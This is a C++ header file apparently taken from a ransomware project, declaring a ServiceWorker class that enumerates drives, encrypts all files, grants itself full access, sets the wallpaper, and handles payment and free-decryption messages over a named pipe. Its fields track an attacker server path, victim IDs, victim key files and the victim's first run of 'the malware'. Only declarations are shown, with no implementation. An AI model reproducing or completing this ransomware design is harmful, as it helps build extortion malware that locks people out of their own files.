#pragma once
#include "..\..\include\Singleton.hpp"
#include "..\..\Encrypter\FileEncrypter.hpp"
#include "..\..\Encrypter\CryptoKeyManager.hpp"
#include "..\..\include\ComsServer.hpp"

#include <string>
#include <vector>
#include <filesystem>
#include <memory>

class ServiceWorker final : public Singleton<ServiceWorker>
{
	friend class Singleton<ServiceWorker>;
	ServiceWorker();

public:
	using DriverList = std::vector<std::string>;
	using FilePath = std::filesystem::path;
	~ServiceWorker();

	void				init();

	DriverList			getDrives();
	void				encryptAllFiles(const DriverList& drivers);
	void 				decryptAllFiles(const DriverList& drivers);
	FilePath			decryptRandomFile();

	const std::string&	getPrivateKeyFilePath() const;
	const std::string&	getPublicKeyFilePath() const;

	void				unpackResources();
	void				grantFullAccess();
	void				openGUI();
	void				setWallpaper();

	void				handleServerComs(std::unique_ptr<NamedPipeServer> server);
	void				handlePaymentMsg();
	void				handleFreeDecryptMsg();
	void				handleDecryptionMsg();

private:
	void				searchAndEncryptFiles(const std::filesystem::path& dir, bool decrypt);
	bool				createAndCheckFirstRunData();
	void				fillVictimDataFile(std::ofstream& file);
	void				readVictimDataFile(std::ifstream& file);
	void				unpackZIP(const std::string& zipPath, const std::string& destPath);
	void				sysCall(const char* cmd);

	FileEncrypter*		m_fileEncrypter{ nullptr };
	CryptoKeyManager*	m_keyManager{ nullptr };
	std::string			m_attackerServerDirPath;
	std::string			m_victimID;					// SysUserName_<RandomString(16)> (eg. "JohnDoe_1234567890abcdef")
	std::string			m_victimDataFilePath;		// <m_victimID>.dat (eg. "JohnDoe_1234567890abcdef.dat")
	std::string			m_victimPrivateKeyPath;		// <m_victimID>.pem (eg. "JohnDoe_1234567890abcdef.pem")
	std::string			m_victimPublicKeyPath;		// <m_victimID>.pub (eg. "JohnDoe_1234567890abcdef.pub")
	std::tm				m_victimFirstRunTime;		// Time when victim run the malware for the first time

	bool				m_usedFreeDecryption;		// True if victim used free decryption
	FilePath			m_skippedUnecryptedFile;
};

